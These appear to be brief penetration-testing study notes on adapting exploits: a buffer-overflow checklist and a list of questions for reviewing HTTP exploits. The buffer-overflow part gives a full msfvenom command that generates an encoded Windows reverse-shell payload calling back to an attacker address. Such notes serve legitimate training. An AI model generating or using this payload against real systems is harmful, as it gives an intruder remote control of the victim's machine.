### Buffer overflow
- make sure the connection works, cross-compile if necessary. (Make sure to use libraries)
- Check for any mentioned "bad characters"
Use MSFVenom for a payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.231 LPORT=4444 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
- Check if the jump is correct

### Http
- Does it initiate an HTTP or HTTPS connection?
- Does it access a specific web application path or route?
- Does the exploit leverage a pre-authentication vulnerability?
- If not, how does the exploit authenticate to the web application?
- How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
- Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
- Will oddities such as self-signed certificates disrupt the exploit?
